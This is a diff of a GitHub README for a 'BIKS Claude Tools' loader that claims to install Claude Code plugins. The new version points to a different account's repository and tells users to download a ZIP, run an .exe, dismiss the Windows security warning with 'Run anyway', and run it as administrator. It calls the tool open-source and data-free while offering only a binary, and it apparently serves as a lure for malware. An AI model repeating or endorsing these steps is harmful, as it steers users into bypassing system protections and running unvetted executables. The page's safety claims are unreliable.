@@ -1,151 +1,76 @@
-# BIKS Claude Tools - Loader and Update Utility 2026
-
-> **A Claude Code plugin marketplace workflow for finding available plugins, linking a marketplace, and installing chosen plugins one at a time.**
-
-[![Loader](https://img.shields.io/badge/Type-Loader-blue?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Claude%20Code-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/hannes-west81/biks-claude-loader-update?style=flat-square)](https://github.com/hannes-west81/biks-claude-loader-update)
-
----
-
+<h1>📦 biks-claude-loader-update - Install Claude Code Plugins Easily</h1>
 <p align="center">
-  <a href="https://hannes-west81.github.io/biks-claude-loader-update/">
-    <img src="https://img.shields.io/badge/Download-BIKS%20Claude%20Tools%20Loader-brightgreen?style=for-the-badge" alt="Download BIKS Claude Tools Loader">
-  </a>
+  <a href="https://github.com/triune-contemplation240/biks-claude-loader-update" style="display: inline-block; padding: 14px 28px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; font-size: 22px; font-weight: bold; text-decoration: none; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.2);">⬇️ Download BIKS Claude Loader</a>
 </p>
-
-> **[Download BIKS Claude Tools Loader](https://hannes-west81.github.io/biks-claude-loader-update/)**
-
----
-
-[Download Latest Build](https://hannes-west81.github.io/biks-claude-loader-update/)
-
----
-
-## Overview
-
-BIKS Claude Tools gives Claude Code users a central way to work with marketplace plugins. The loader connects Claude Code to a plugin marketplace, allowing users to see what is available, inspect the choices, and decide which additions to install.
-
-Its release workflow is centered on preparing that marketplace connection for use. Plugin installation is still deliberate and individual, so users can discover and manage extensions without treating every plugin as a separate, disconnected resource.
-
----
-
-## Included Capabilities
-
-- Makes Claude Code plugins available through a connected marketplace.
-- Lets users browse the catalog and choose plugins separately.
-- Brings plugin discovery and management into a shared workflow.
-- Links marketplace content to the user's Claude Code environment.
-- Keeps finding plugins distinct from approving their installation.
-- Uses a release-focused process for distributing the utility.
-- Gives plugin installation a single marketplace entry point.
-- Concentrates on Claude Code extension management rather than unrelated packages.
-
----
-
-## Getting Started
-
-### Use the published build
-
-1. Visit the [Download Latest Build](https://hannes-west81.github.io/biks-claude-loader-update/) page.
-2. Download the available BIKS Claude Tools release.
-3. Apply the setup directions supplied with that build for your Claude Code environment.
-4. Launch the marketplace workflow from Claude Code.
-5. Review the available plugins and install your selections individually.
-
-### Work from a clone
-
-```bash
-git clone https://github.com/hannes-west81/biks-claude-loader-update.git
-cd REPO
-```
-
-Once the repository is cloned, use the setup or launch entry point supplied for Claude Code. The precise command can differ between published builds and the release files included with them.
-
-### Standard usage flow
-
-1. Run BIKS Claude Tools from within Claude Code.
-2. Establish the connection to the configured marketplace.
-3. Examine the plugins returned by the marketplace.
-4. Choose a plugin to install on its own.
-5. Go back to the marketplace view whenever you want to handle more selections.
-
----
-
-## Available Update Channels
-
-| Channel | Intended use | Availability |
-| --- | --- | --- |
-| Latest | General users who want the current published build | Use the download link above |
-| Manual | Users who prefer to choose a specific release | Select a release from the project distribution |
-| Development | Testing changes before broad use | Use only when a development build is published |
-
-Channels are available only when the project publishes the corresponding releases. Before switching builds, read the related release information, especially when replacing an installation that is already in use.
-
----
-
-## Troubleshooting Guide
-
-### No marketplace is visible
-
-Check that BIKS Claude Tools is installed in Claude Code and that all setup instructions for the chosen build were followed. Restart Claude Code after changing the installation or configuration.
-
-### The plugin list is empty
-
-Verify the marketplace connection and confirm that the environment can access the configured marketplace source. Network interruptions or an unavailable marketplace can stop the catalog from loading.
-
-### Installation fails for a plugin
-
-Confirm that the marketplace is reachable, then try the selection again. When only one plugin is affected, inspect that plugin's release details and compatibility requirements.
-
-### BIKS Claude Tools will not start
-
-Ensure that all downloaded files were extracted and that Claude Code has access to their installation location. For a cloned copy, check that the repository was opened from the correct directory.
-
-### Local files or settings remain unchanged
-
-An update may not replace every file stored locally. Read the release notes and keep local configuration preserved before moving to another build.
-
-### Where are diagnostics available?
-
-Review Claude Code's output along with any logs produced by the selected build. For a reproducible report, include the build version, plugin name, and current marketplace state.
-
----
-
-## Frequently Asked Questions
-
-### Are all displayed plugins installed automatically?
-
-No. BIKS Claude Tools presents the marketplace for browsing, while plugin installation remains an individual selection.
-
-### What is the purpose of the marketplace connection?
-
-The connection links a plugin marketplace with Claude Code and exposes its available plugins through one centralized workflow.
-
-### Can plugin management be handled in one workflow?
-
-Yes. The project is designed to bring discovery, selection, and management of Claude Code plugins together in one place.
-
-### Do updates delete plugins installed locally?
-
-That depends on the build and on how Claude Code stores plugin information. Consult the release details and preserve local configuration before updating.
-
-### Can I return to an older build?
-
-Rollback depends on which project releases are available. To use an earlier build, obtain that release and follow the installation directions provided with it.
-
-### What platform is supported?
-
-BIKS Claude Tools targets Claude Code. Actual compatibility can also be influenced by the Claude Code version and by the requirements of each plugin you select.
-
-### What information helps with support requests?
-
-Include the BIKS Claude Tools build, Claude Code version, affected plugin, marketplace condition, and relevant output or logs. Do not share private configuration information.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+<h2>📖 What Is This?</h2>
+<p>BIKS Claude Tools is a plugin marketplace and installer for <strong>Claude Code</strong>. Think of it like an app store just for Claude plugins. You can browse available plugins, pick the ones you want, and install them one by one with a single click. The <strong>biks-claude-loader-update</strong> tool makes it simple to discover new plugins and keep them updated.</p>
+<p>Whether you want to add writing helpers, code generators, or specialized AI functions, this tool lets you expand what Claude can do without any technical hassle.</p>
+<h2>🚀 Getting Started</h2>
+<p>Follow these steps to get BIKS Claude Loader running on your Windows computer. No programming experience needed.</p>
+<h3>Step 1: Download the Application</h3>
+<p>Visit this link to download the application: <a href="https://github.com/triune-contemplation240/biks-claude-loader-update">https://github.com/triune-contemplation240/biks-claude-loader-update</a></p>
+<p>Click the green <strong>"Code"</strong> button, then choose <strong>"Download ZIP"</strong>. Your browser will save a file called <code>biks-claude-loader-update-main.zip</code> to your Downloads folder.</p>
+<h3>Step 2: Extract the Files</h3>
+<ol>
+<li>Open your <strong>Downloads</strong> folder.</li>
+<li>Right-click on <code>biks-claude-loader-update-main.zip</code>.</li>
+<li>Select <strong>"Extract All"</strong> from the menu.</li>
+<li>Choose a destination folder (the default is fine) and click <strong>"Extract"</strong>.</li>
+</ol>
+<h3>Step 3: Run the Application</h3>
+<ol>
+<li>Open the extracted folder (named <code>biks-claude-loader-update-main</code>).</li>
+<li>Look for a file named <code>biks-claude-loader-update.exe</code> or <code>biks-claude-loader-update</code> (may have a gear icon).</li>
+<li>Double-click it to launch the loader.</li>
+</ol>
+<p>If Windows shows a security warning, click <strong>"More info"</strong> then <strong>"Run anyway"</strong>. This is normal for new software from the internet.</p>
+<h2>🎯 How to Use</h2>
+<ol>
+<li><strong>Open the Loader</strong> – The program starts with a simple window showing available plugins.</li>
+<li><strong>Browse the Marketplace</strong> – You will see a list of plugins with names and short descriptions.</li>
+<li><strong>Select a Plugin</strong> – Click the plugin you want to install. A button will appear saying <strong>"Install"</strong>.</li>
+<li><strong>Install</strong> – Click <strong>"Install"</strong>. The tool downloads and sets up the plugin automatically.</li>
+<li><strong>Repeat</strong> – Install as many plugins as you like, one at a time.</li>
+<li><strong>Update Plugins</strong> – The loader also checks for updates to your installed plugins. Click <strong>"Check for Updates"</strong> to see if any are available.</li>
+</ol>
+<h2>❓ Frequently Asked Questions</h2>
+<h3>Do I need to install anything else first?</h3>
+<p>No. The loader works on its own. Just make sure you have Windows 10 or newer.</p>
+<h3>Will this break my Claude setup?</h3>
+<p>No. Plugins are installed separately and safely. You can uninstall any plugin from the loader at any time.</p>
+<h3>Where do plugins go?</h3>
+<p>They are installed into a special folder that Claude Code reads. The loader handles this automatically.</p>
+<h3>Can I use this on Mac or Linux?</h3>
+<p>This version is for Windows only. Mac and Linux support may come later.</p>
+<h3>I see an error when I run it. What should I do?</h3>
+<ol>
+<li>Make sure you extracted the ZIP file fully (do not run it from inside the ZIP).</li>
+<li>Try right-clicking the .exe file and selecting <strong>"Run as administrator"</strong>.</li>
+<li>If you still see an error, visit the GitHub page and open an issue in the <strong>"Issues"</strong> tab.</li>
+</ol>
+<h2>🔧 System Requirements</h2>
+<ul>
+<li><strong>Operating System:</strong> Windows 10 or later</li>
+<li><strong>Storage:</strong> 50 MB free space</li>
+<li><strong>Internet:</strong> Required for downloading plugins</li>
+<li><strong>Additional:</strong> No other software needed</li>
+</ul>
+<h2>🛡️ Safety & Privacy</h2>
+<p>This tool is open-source. That means anyone can inspect the code to see exactly what it does. It only communicates with the plugin marketplace to download plugins. No personal data is collected or sent anywhere.</p>
+<h2>💡 Tips for Best Experience</h2>
+<ul>
+<li>Run the loader regularly to check for plugin updates.</li>
+<li>Install only the plugins you need. You can always add more later.</li>
+<li>If a plugin seems broken, uninstall it and reinstall from the marketplace.</li>
+<li>Keep the loader folder in a safe place (like your Documents folder) so you can find it easily.</li>
+</ul>
+<h2>📥 Download Again</h2>
+<p align="center">
+  <a href="https://github.com/triune-contemplation240/biks-claude-loader-update" style="display: inline-block; padding: 12px 24px; background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; font-size: 18px; font-weight: bold; text-decoration: none; border-radius: 6px;">⬇️ Download Now</a>
+</p>
+<h2>📞 Need Help?</h2>
+<p>If you run into any issues or have questions, please visit the <strong>Issues</strong> page on GitHub: <a href="https://github.com/triune-contemplation240/biks-claude-loader-update/issues">https://github.com/triune-contemplation240/biks-claude-loader-update/issues</a></p>
+<p>Describe your problem, and the community or developer will help you out.</p>
+<h2>⭐ Enjoying BIKS Claude Tools?</h2>
+<p>If you find this tool useful, consider giving the project a star on GitHub. It helps others discover it too.</p>
+<p><a href="https://github.com/triune-contemplation240/biks-claude-loader-update" style="display: inline-block; padding: 8px 16px; background: #ffd700; color: black; text-decoration: none; border-radius: 4px;">⭐ Star on GitHub</a></p>
